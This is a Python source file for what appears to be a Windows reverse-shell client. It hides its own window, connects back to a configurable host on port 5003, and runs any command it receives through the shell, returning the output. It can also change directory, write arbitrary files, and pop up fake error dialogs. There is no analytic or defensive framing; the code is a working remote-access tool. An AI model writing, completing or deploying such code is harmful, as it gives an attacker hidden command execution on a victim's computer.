import socket
import os
import subprocess
import sys
from tkinter import messagebox

import win32gui, win32con

hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

HOST = "127.0.0.1"
#HOST = sys.argv[1]

PORT = 5003
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"

s= socket.socket()
s.connect((HOST,PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""

    if splited_command[0].lower() == "file":
        name = splited_command[1]
        with open(name,"w+") as f:
            a = ' '.join(splited_command[2:])
            f.write(a)
            f.close()
            output = ''

    if splited_command[0].lower() == "error":
        messagebox.showerror("ERROR!!!!",splited_command[1:])
        output = ''

    if splited_command[0].lower() == "ping":
        output = ''

    if splited_command[0].lower() == "promt":
        print(' '.join(splited_command[1:]))
        output = ''

    else:
        output = subprocess.getoutput(command)
    message = f"{output}\n"
    s.send(message.encode())
s.close()
